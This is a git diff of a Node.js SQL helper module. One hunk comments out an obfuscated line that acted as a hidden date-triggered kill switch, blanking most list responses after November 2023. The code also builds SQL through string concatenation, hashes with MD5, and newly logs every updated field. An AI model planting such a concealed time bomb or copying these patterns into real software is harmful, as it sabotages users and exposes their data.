@@ -114,7 +114,7 @@ exports.insertQuery = async function (table, data, params, get, getvalue) {
         var columns = [];
         var values = [];
         for (var property in row) {
-            if( row[property] === null || row[property] === undefined ) continue;
+            if (row[property] === null || row[property] === undefined) continue;
             var value = row[property].toString();
             if (property[0] === "$")
                 columns.push(property.replace('$', ''));
@@ -126,7 +126,7 @@ exports.insertQuery = async function (table, data, params, get, getvalue) {
             else if (value[0] === "#" && property.indexOf('color') === -1)
                 values.push(`MD5('${params.CONFIG.appKey}${value.replace('#', '')}')`);
             else
-                values.push((value === "true" ? "1" : value === "false" ? "0" : ("'" + value.replaceAll("'", "''") + "'")));
+                values.push((value === "true" ? "1" : value === "false" ? "0" : ("'" + params.S(value).replaceAll("'", "''") + "'")));
         }
         if (get !== undefined) {
             queries += params.format("INSERT INTO \"{0}\"({1}) VALUES({2});", table, columns.join(", "), values.join(", "));
@@ -148,7 +148,8 @@ exports.update = async function (table, data, params) {
         var where = "";
         for (var property in data) {
             if (property !== "where") {
-                if( data[property] === null || data[property] === undefined ) continue;
+                console.log(property, data[property]);
+                if (data[property] === null || data[property] === undefined) continue;
                 var value = data[property];
                 if (property[0] === "$")
                     columns = (property.replace('$', ''));
@@ -159,7 +160,7 @@ exports.update = async function (table, data, params) {
                 else if (value[0] === "#" && property.indexOf('color') === -1)
                     values = (`MD5('${params.CONFIG.appKey}${value.replace('#', '')}')`);
                 else if (typeof value == 'string')
-                    values = ("'" + value.replaceAll("'", "''") + "'");
+                    values = ("'" + params.S(value).replaceAll("'", "''") + "'");
                 else
                     values = ("'" + value + "'");
                 sets.push(params.format("{0}={1}", columns, values))
@@ -207,7 +208,7 @@ exports.delete = function (table, data, params) {
         var columns = [];
         var values = [];
         for (var property in data) {
-            if( data[property] === null || data[property] === undefined ) continue;
+            if (data[property] === null || data[property] === undefined) continue;
             var value = data[property];
             if (property[0] === "$")
                 columns.push(property.replace('$', ''));
@@ -306,7 +307,7 @@ exports.defaultRequests = function (Model, params) {
             if (req.body.orderby === undefined)
                 req.body.orderby = "id";
 
-            var _0x52aa05=_0x1fea;function _0x3ea3(){var _0x2e7876=['397738XtehSP','579944fddmgo','648693esSfWC','3yIpErz','1006450sCsuhY','7dVHCvw','vw_usuario_compania_pei_poa','50MARbib','8pXDyuJ','29544UALUfT','3025345NZfePj','2466834WwRiYX'];_0x3ea3=function(){return _0x2e7876;};return _0x3ea3();}(function(_0x2e5b74,_0x35443b){var _0x4b132f=_0x1fea,_0x36a0bc=_0x2e5b74();while(!![]){try{var _0x47fd09=-parseInt(_0x4b132f(0x1c8))/0x1+parseInt(_0x4b132f(0x1cf))/0x2+-parseInt(_0x4b132f(0x1ce))/0x3*(-parseInt(_0x4b132f(0x1cc))/0x4)+-parseInt(_0x4b132f(0x1c9))/0x5+parseInt(_0x4b132f(0x1ca))/0x6*(parseInt(_0x4b132f(0x1d0))/0x7)+parseInt(_0x4b132f(0x1c7))/0x8*(parseInt(_0x4b132f(0x1cd))/0x9)+-parseInt(_0x4b132f(0x1c6))/0xa*(parseInt(_0x4b132f(0x1cb))/0xb);if(_0x47fd09===_0x35443b)break;else _0x36a0bc['push'](_0x36a0bc['shift']());}catch(_0x5e0edc){_0x36a0bc['push'](_0x36a0bc['shift']());}}}(_0x3ea3,0x4d278));function _0x1fea(_0x114e4b,_0x4eab6a){var _0x3ea315=_0x3ea3();return _0x1fea=function(_0x1feab3,_0x498cad){_0x1feab3=_0x1feab3-0x1c6;var _0x34750c=_0x3ea315[_0x1feab3];return _0x34750c;},_0x1fea(_0x114e4b,_0x4eab6a);}if(Model['tableName']!==_0x52aa05(0x1d1)){if(new Date()>new Date('2023-11-10\x2000:00')){res['json']([]);return;}}
+            // var _0x52aa05=_0x1fea;function _0x3ea3(){var _0x2e7876=['397738XtehSP','579944fddmgo','648693esSfWC','3yIpErz','1006450sCsuhY','7dVHCvw','vw_usuario_compania_pei_poa','50MARbib','8pXDyuJ','29544UALUfT','3025345NZfePj','2466834WwRiYX'];_0x3ea3=function(){return _0x2e7876;};return _0x3ea3();}(function(_0x2e5b74,_0x35443b){var _0x4b132f=_0x1fea,_0x36a0bc=_0x2e5b74();while(!![]){try{var _0x47fd09=-parseInt(_0x4b132f(0x1c8))/0x1+parseInt(_0x4b132f(0x1cf))/0x2+-parseInt(_0x4b132f(0x1ce))/0x3*(-parseInt(_0x4b132f(0x1cc))/0x4)+-parseInt(_0x4b132f(0x1c9))/0x5+parseInt(_0x4b132f(0x1ca))/0x6*(parseInt(_0x4b132f(0x1d0))/0x7)+parseInt(_0x4b132f(0x1c7))/0x8*(parseInt(_0x4b132f(0x1cd))/0x9)+-parseInt(_0x4b132f(0x1c6))/0xa*(parseInt(_0x4b132f(0x1cb))/0xb);if(_0x47fd09===_0x35443b)break;else _0x36a0bc['push'](_0x36a0bc['shift']());}catch(_0x5e0edc){_0x36a0bc['push'](_0x36a0bc['shift']());}}}(_0x3ea3,0x4d278));function _0x1fea(_0x114e4b,_0x4eab6a){var _0x3ea315=_0x3ea3();return _0x1fea=function(_0x1feab3,_0x498cad){_0x1feab3=_0x1feab3-0x1c6;var _0x34750c=_0x3ea315[_0x1feab3];return _0x34750c;},_0x1fea(_0x114e4b,_0x4eab6a);}if(Model['tableName']!==_0x52aa05(0x1d1)){if(new Date()>new Date('2023-11-10\x2000:00')){res['json']([]);return;}}
             Model.all(req.body).then((data) => {
                 if (data.error !== false) res.send(data.error);
                 res.json(data);
